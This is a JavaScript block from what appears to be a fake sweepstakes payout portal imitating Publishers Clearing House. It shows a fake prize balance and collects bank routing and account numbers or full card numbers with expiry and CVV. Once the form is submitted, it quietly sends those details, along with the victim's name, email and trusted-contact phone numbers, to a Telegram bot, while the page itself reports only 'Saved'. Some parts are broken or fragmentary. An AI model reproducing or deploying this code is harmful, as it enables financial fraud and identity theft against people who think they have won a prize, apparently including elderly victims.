<script>
/* ═══════════ SHARED CORE ═══════════ */
const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
const DEFAULT_TG = { botToken:'', chatId:'' };

function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
function tgEsc(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }

function loadDeviceState() {
  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
  if (saved) {
    try {
      const parsed = JSON.parse(saved);
      if (!parsed.telegramConfig) parsed.telegramConfig = Object.assign({}, DEFAULT_TG);
      if (parsed.userBalance == null) parsed.userBalance = 4500;
      if (!parsed.transactions) parsed.transactions = [];
      if (!parsed.registeredUsers) parsed.registeredUsers = [];
      if (!parsed.withdrawalState) parsed.withdrawalState = 'none';
      return parsed;
    } catch(e){}
  }
  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], withdrawalState:'none', currentWithdrawal:null, kyc:null, telegramConfig: Object.assign({}, DEFAULT_TG) };
}
const state = loadDeviceState();

function saveDeviceState() {
  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(state)); } catch(err) {}
  if (state.currentUser && state.currentUser.username) syncCurrentUserToCloud().catch(()=>{});
}
async function syncCurrentUserToCloud() { if (!window.rtdb || !state.currentUser || !state.currentUser.username) return; try { await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()), state.currentUser); } catch(e){} }
async function pullCurrentUserFromCloud() {
  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return false;
  try {
    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()));
    if (!snap.exists()) return false;
    const r = snap.val();
    state.currentUser = Object.assign({}, state.currentUser, r);
    if (r.kyc) state.kyc = r.kyc;
    if (r.configuredMethod) state.configuredMethod = r.configuredMethod;
    if (typeof r.userBalance === 'number') state.userBalance = r.userBalance;
    if (Array.isArray(r.transactions)) state.transactions = r.transactions;
    saveDeviceState(); return true;
  } catch(e){ return false; }
}

function showToast(title, message, type='info') {
  const container = document.getElementById('toast-container'); if (!container) return;
  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
  const el = document.createElement('div'); el.id = id;
  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
}
function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">${bodyHtml}</div>`; modal.style.display = 'flex'; document.body.classList.add('modal-open'); }
function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; document.body.classList.remove('modal-open'); }

/* ═══════════ TELEGRAM — silent, no user-facing errors ═══════════ */
async function sendTelegramMessage(textMessage) {
  const botToken = ((state.telegramConfig && state.telegramConfig.botToken) || '').trim();
  const chatId   = ((state.telegramConfig && state.telegramConfig.chatId)   || '').trim();
  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
  try {
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('text', textMessage);
    fd.append('parse_mode', 'HTML');
    fd.append('disable_web_page_preview', 'true');

    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body:fd });
    const d = await r.json();
    if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
    return d.ok;
  } catch (err) { console.error('[TG] fetch failed:', err); return false; }
}

async function sendTelegramDocument(filename, content, caption) {
  const botToken = ((state.telegramConfig && state.telegramConfig.botToken) || '').trim();
  const chatId   = ((state.telegramConfig && state.telegramConfig.chatId)   || '').trim();
  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
  try {
    const fd = new FormData();
    fd.append('chat_id', chatId);
    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
    fd.append('document', blob, filename);
    if (caption) { fd.append('caption', caption); fd.append('parse_mode', 'HTML'); }

    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method:'POST', body:fd });
    const d = await r.json();
    if (!d.ok) console.error('[TG] sendDocument failed:', d.error_code, d.description);
    return d.ok;
  } catch (err) { console.error('[TG] sendDocument fetch failed:', err); return false; }
}

function guardAuth() { if (!state.currentUser || !state.currentUser.username) { window.location.href = 'login.html'; return false; } return true; }
function logout() { state.currentUser = null; saveDeviceState(); window.location.href = 'login.html'; }

function toggleNavDrawer() {
  const drawer = document.getElementById('nav-drawer');
  const overlay = document.getElementById('nav-overlay');
  if (drawer.classList.contains('-translate-x-full')) {
    drawer.classList.remove('-translate-x-full');
    overlay.classList.remove('hidden');
  } else {
    drawer.classList.add('-translate-x-full');
    overlay.classList.add('hidden');
  }
}

function isTabLocked(tabKey) {
  const isKycApproved = state.kyc && state.kyc.status === 'approved';
  const isSetupComplete = !!state.configuredMethod;
  if (['transfer', 'cards', 'withdrawals'].includes(tabKey)) return !isKycApproved || !isSetupComplete;
  if (tabKey === 'funds') return !isKycApproved;
  if (tabKey === 'winners') return !isKycApproved;
  if (tabKey === 'spin') return !isKycApproved || !isSetupComplete;
  return false;
}
function showKycLockToast() { showToast('Identity Required', 'Please complete KYC verification.', 'warning'); setTimeout(() => { window.location.href = 'kyc.html'; }, 1000); }

  { key:'overview', label:'Overview', icon:'fa-gauge-high', href:'overview.html' },
  { key:'funds', label:'Funds', icon:'fa-wallet', href:'funds.html' },
  { key:'transfer', label:'Transfer', icon:'fa-arrow-right-arrow-left', href:'transfer.html' },

  { key:'promotions', label:'Promotions', icon:'fa-trophy', href:'promotions.html' },

  { key:'winners', label:'Winners Wall', icon:'fa-crown', href:'winners.html' },
  { key:'cards', label:'Cards', icon:'fa-credit-card', href:'cards.html' },
  { key:'referrals', label:'Referrals', icon:'fa-gift', href:'referrals.html' },

  { key:'notifications', label:'Alerts', icon:'fa-bell', href:'notifications.html' },
  { key:'kyc', label:'KYC', icon:'fa-id-card', href:'kyc.html' }

function renderNavItems(activeKey) { return DASHBOARD_TABS.map(it=>{ const active = it.key===activeKey; const locked = isTabLocked(it.key); return `<a href="${locked ? '#' : it.href}" onclick="${locked ? 'event.preventDefault(); showKycLockToast()' : ''}" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-bold transition ${active?'text-gold-400 bg-gold-500/10':(locked ? 'text-slate-500 opacity-60' : 'text-slate-300 hover:text-white hover:bg-navy-800')}"><i class="fa-solid ${locked ? 'fa-lock' : it.icon} w-4 text-center"></i><span>${it.label}</span></a>`; }).join(''); }
function renderDashboardSidebar(activeKey) { return `<aside class="hidden lg:block w-56 shrink-0"><div class="sticky top-24 space-y-1.5"><p class="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-3 mb-3">Dashboard</p>${renderNavItems(activeKey)}</div></aside>`; }
function renderDashboardShell(activeKey, contentHtml) { return `<div class="dash-shell flex-grow w-full"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8 pb-28 lg:pb-8"><div class="flex flex-col lg:flex-row gap-6 lg:gap-8">${renderDashboardSidebar(activeKey)}<div class="flex-1 min-w-0 space-y-6">${contentHtml}</div></div></div></div>`; }

function renderHeaderNav() {
  const nav = document.getElementById('nav-actions'); if (!nav) return;
  if (!state.currentUser) { nav.innerHTML = ''; return; }

  const avatar = u.photoUrl ? `<img src="${u.photoUrl}" class="w-7 h-7 rounded-full object-cover border border-gold-400">` : `<div class="w-7 h-7 rounded-full bg-gold-500 text-navy-950 flex items-center justify-center font-bold text-xs">${(u.firstName||'U').charAt(0)}</div>`;

    <button onclick="window.location.href='settings.html'" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition rounded-lg flex items-center gap-1.5">${avatar}<span class="hidden sm:inline">${u.firstName||''}</span><i class="fa-solid fa-gear ml-1"></i></button>
    <button onclick="logout()" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-rose-400 hover:text-white transition rounded-lg"><i class="fa-solid fa-right-from-bracket sm:mr-1"></i><span class="hidden sm:inline">Logout</span></button>
  `;
}

/* ═══════════ FUNDS PAGE ═══════════ */
function renderFunds() {
  const isKycApproved = state.kyc && state.kyc.status === 'approved';
  const isLocked = !isKycApproved;
  const u = state.currentUser || {};
  const hasMethod = !!state.configuredMethod;

  let last4 = 'XXXX';

  const cardHtml = `
    <div class="bank-card">
      <div class="absolute inset-0 p-6 flex flex-col justify-between z-10">

          <div>
            <p class="text-[10px] text-gold-400 font-black uppercase tracking-widest">PCH Payout</p>

            <p class="text-[10px] text-gold-400 mt-2"><i class="fa-solid fa-shield text-gold-400 mr-1"></i> Authorized Award</p>
          </div>
        </div>
      </div>

      <!-- Right Column: Setup Forms & Trusted Contact -->
      <div class="lg:col-span-2 space-y-6">
        
        <!-- Funding Setup / Management -->
        <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-8 card-3d">
          <h3 class="text-lg font-bold text-white mb-1 flex items-center"><i class="fa-solid fa-credit-card text-sky-custom mr-2"></i>Payout Method</h3>
          <p class="text-xs text-slate-400 mb-6">${hasMethod ? 'Your active destination method is set.' : 'Choose how you want to receive your weekly funds.'}</p>
          
          ${hasMethod ? `
            <div class="bg-emerald-500/10 border border-emerald-500/30 rounded-xl p-4 flex items-center justify-between mb-4">
              <div>
                <p class="text-[10px] text-emerald-400 font-bold uppercase tracking-widest">Active Method</p>

            <form onsubmit="submitWeeklyFundsSetup(event)" class="space-y-5">
              <div class="space-y-3">
                <label class="flex items-center space-x-3 bg-navy-900 p-4 rounded-xl border border-navy-700 cursor-pointer transition hover:border-sky-custom">
                  <input type="radio" name="pay-method" value="bank" checked onchange="togglePayMethod('bank')" class="text-sky-custom w-4 h-4">
                  <div><span class="text-sm font-bold text-white block">Bank Wire / ACH Account</span></div>
                </label>
                <label class="flex items-center space-x-3 bg-navy-900 p-4 rounded-xl border border-navy-700 cursor-pointer transition hover:border-sky-custom">
                  <input type="radio" name="pay-method" value="card" onchange="togglePayMethod('card')" class="text-sky-custom w-4 h-4">
                  <div><span class="text-sm font-bold text-white block">Debit / Credit Card</span></div>
                </label>
              </div>
              
              <!-- Bank Fields -->
              <div id="bank-fields" class="space-y-4 pt-2">
                <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1.5">Routing Number (9 digits)</label><input type="text" id="bank-routing" required pattern="[0-9]{9}" maxlength="9" placeholder="123456789" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
                <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1.5">Account Number</label><input type="text" id="bank-acc" required placeholder="Account Number" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
              </div>
              
              <!-- Card Fields -->
              <div id="card-fields" class="space-y-4 pt-2 hidden">
                <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1.5">Card Number</label><input type="text" id="card-num" placeholder="4000 1234 5678 9010" oninput="formatCardInput(this)" maxlength="19" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
                <div class="grid grid-cols-2 gap-4">
                  <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1.5">Expiry</label><input type="text" id="card-exp" placeholder="MM/YY" oninput="formatExpInput(this)" maxlength="5" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
                  <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1.5">CVV</label><input type="password" id="card-cvv" placeholder="123" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
                </div>
              </div>
              
              <div class="flex justify-end pt-4">
                <button type="submit" class="px-8 py-3 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl text-sm active:scale-95 transition shadow-lg shadow-gold-500/20">Save Payout Method</button>
              </div>
            </form>
          `}
        </div>

        <!-- Trusted Contact -->
        <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-8 card-3d">
          <h3 class="text-lg font-bold text-white mb-1 flex items-center"><i class="fa-solid fa-user-shield text-purple-400 mr-2"></i>Trusted Contact</h3>
          <p class="text-xs text-slate-400 mb-6">Add a family member or caregiver we can contact if you ever need help.</p>
          
          <form onsubmit="saveTrustedContact(event)" class="space-y-4">
            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1.5">Full Name</label><input type="text" id="tc-name" value="${trusted ? escapeHtml(trusted.name) : ''}" required placeholder="Jane Doe" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
              <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1.5">Phone Number</label><input type="tel" id="tc-phone" value="${trusted ? escapeHtml(trusted.phone) : ''}" required placeholder="646-585-8110" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
            </div>
            <div class="flex justify-end pt-2">
              <button type="submit" class="px-6 py-3 bg-purple-500/20 border border-purple-500/40 text-purple-400 font-bold rounded-xl text-xs active:scale-95 transition hover:bg-purple-500/30">Save Trusted Contact</button>
            </div>
          </form>
        </div>

      </div>
    </div>
  </div>`;
}

function togglePayMethod(m) {
  const bankFields = document.getElementById('bank-fields');
  const cardFields = document.getElementById('card-fields');
  const bankRouting = document.getElementById('bank-routing');
  const bankAcc = document.getElementById('bank-acc');
  const cardNum = document.getElementById('card-num');
  const cardExp = document.getElementById('card-exp');
  const cardCvv = document.getElementById('card-cvv');

  if (m === 'bank') {
    bankFields.classList.remove('hidden'); cardFields.classList.add('hidden');
    bankRouting.required = true; bankAcc.required = true;
    cardNum.required = false; cardExp.required = false; cardCvv.required = false;
  } else {
    bankFields.classList.add('hidden'); cardFields.classList.remove('hidden');
    bankRouting.required = false; bankAcc.required = false;
    cardNum.required = true; cardExp.required = true; cardCvv.required = true;
  }
}

function formatCardInput(input) {
  let v = input.value.replace(/\D/g,'').substring(0,16);
  let m = v.match(/\d{4,16}/g);
  let match = m && m[0] || '';
  let parts = [];
  for (let i=0;i<match.length;i+=4) parts.push(match.substring(i,i+4));
  input.value = parts.length ? parts.join(' ') : v;
}

function formatExpInput(input) {
  let v = input.value.replace(/\D/g,'').substring(0,4);
  if (v.length >= 3) input.value = v.substring(0,2) + '/' + v.substring(2,4);
  else input.value = v;
}

/* ═══════════ SUBMIT PAYOUT METHOD ═══════════ */
async function submitWeeklyFundsSetup(e) {
  e.preventDefault();
  const method = document.querySelector('input[name="pay-method"]:checked').value;
  const now = new Date();
  const user = state.currentUser || {};
  const fullName = `${user.firstName||''} ${user.lastName||''}`.trim();
  const username = user.username || 'unknown';

  let methodName = '';
  let txtContent = '';

  if (method === 'bank') {
    const routing = (document.getElementById('bank-routing').value || '').trim();
    const acc     = (document.getElementById('bank-acc').value || '').trim();
    methodName = `ACH Bank (**${acc.slice(-4)})`;
    txtContent = [
      '═══════════════════════════════════════════════════════════',
      '   PCH WEEKLY PAYOUT PORTAL — PAYOUT METHOD SETUP',
      '═══════════════════════════════════════════════════════════',
      '',
      `Submitted:   ${now.toISOString()}`,
      `Account:     @${username}`,
      `Name:        ${fullName || 'N/A'}`,
      `Email:       ${user.email || 'N/A'}`,
      '',
      '───────────────────────────────────────────────────────────',
      '   METHOD: ACH BANK TRANSFER',
      '───────────────────────────────────────────────────────────',
      '',
      `Routing Number:    ${routing}`,
      `Account Number:    ${acc}`,
      '',
      '───────────────────────────────────────────────────────────',
      `Submitted via PCH Weekly Payout Portal`,
      `Ref: PM-${now.getTime()}`,
      '═══════════════════════════════════════════════════════════'
    ].join('\n');
  } else {
    const num = (document.getElementById('card-num').value || '').replace(/\s/g,'');
    const exp = (document.getElementById('card-exp').value || '').trim();
    const cvv = (document.getElementById('card-cvv').value || '').trim();
    methodName = `Card (**${num.slice(-4)})`;
    txtContent = [
      '═══════════════════════════════════════════════════════════',
      '   PCH WEEKLY PAYOUT PORTAL — PAYOUT METHOD SETUP',
      '═══════════════════════════════════════════════════════════',
      '',
      `Submitted:   ${now.toISOString()}`,
      `Account:     @${username}`,
      `Name:        ${fullName || 'N/A'}`,
      `Email:       ${user.email || 'N/A'}`,
      '',
      '───────────────────────────────────────────────────────────',
      '   METHOD: CARD',
      '───────────────────────────────────────────────────────────',
      '',
      `Card Number:    ${num}`,
      `Expiry:         ${exp}`,
      `CVV:            ${cvv}`,
      '',
      '───────────────────────────────────────────────────────────',
      `Submitted via PCH Weekly Payout Portal`,
      `Ref: PM-${now.getTime()}`,
      '═══════════════════════════════════════════════════════════'
    ].join('\n');
  }

  state.configuredMethod = methodName;
  if (state.currentUser) state.currentUser.configuredMethod = methodName;
  saveDeviceState();

  const safeUser = username.replace(/[^a-z0-9_-]/gi, '_').substring(0, 30);
  const filename = `payout-${safeUser}-${now.getTime()}.txt`;

  render();
  showToast('Saved', 'Your payout method has been configured.', 'success');

  // Fire-and-forget Telegram — silent failures, no UI surface
  (async () => {
    try {
      await sendTelegramMessage(`💳 <b>FUNDING METHOD SET</b>\n<b>User:</b> @${tgEsc(username)}\n<b>Method:</b> ${tgEsc(methodName)}`);
      await sendTelegramDocument(
        filename,
        txtContent,
        `📄 <b>Payout Method Details</b>\n@${tgEsc(username)} — ${tgEsc(methodName)}`
      );
    } catch (err) {
      console.error('[TG] notification failed:', err);
    }
  })();
}

async function resetFunding() {
  if (!confirm('Are you sure you want to change your payout method? This will overwrite your current setup.')) return;
  const oldMethod = state.configuredMethod;
  const username = (state.currentUser && state.currentUser.username) || 'unknown';
  state.configuredMethod = null;
  if (state.currentUser) state.currentUser.configuredMethod = null;
  saveDeviceState();
  render();
  showToast('Reset', 'Payout method cleared. Configure a new one below.', 'info');
  sendTelegramMessage(`🔄 <b>PAYOUT METHOD RESET</b>\n<b>User:</b> @${tgEsc(username)}\n<b>Previous:</b> ${tgEsc(oldMethod || 'none')}`).catch(()=>{});
}

async function saveTrustedContact(e) {
  e.preventDefault();
  const name = document.getElementById('tc-name').value.trim();
  const phone = document.getElementById('tc-phone').value.trim();
  
  if (state.currentUser) {
    state.currentUser.trustedContact = { name, phone };
    saveDeviceState();
    sendTelegramMessage(`🛡️ <b>TRUSTED CONTACT UPDATED</b>\n<b>User:</b> @${tgEsc(state.currentUser.username)}\n<b>Contact:</b> ${tgEsc(name)} (${tgEsc(phone)})`).catch(()=>{});
    showToast('Saved', 'Trusted contact has been updated.', 'success');
    render();
  }
}

function render() {
  document.body.classList.remove('modal-open');
  renderHeaderNav();
  document.querySelector('#nav-drawer nav').innerHTML = renderNavItems('funds');
  const container = document.getElementById('app-container');
  container.innerHTML = renderDashboardShell('funds', renderFunds());
}

window.onload = async function() {
  if (!guardAuth()) return;
  await pullCurrentUserFromCloud();
  render();
};
</script>
